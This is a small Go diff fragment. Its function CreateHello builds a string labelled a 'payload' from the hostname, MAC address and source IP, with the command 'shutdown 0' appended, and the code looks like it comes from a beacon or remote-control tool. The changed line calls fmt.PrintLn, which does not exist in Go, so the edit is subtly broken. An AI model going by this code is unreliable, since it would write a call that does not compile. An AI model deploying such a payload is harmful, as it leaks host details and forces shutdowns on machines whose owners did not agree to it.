@@ -351,7 +351,7 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 	}
 
 	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + "shutdown 0" 
-	printLn("[+] Payload Created:", hello)
+	fmt.PrintLn("[+] Payload Created:", hello)
 
 	return hello
 }
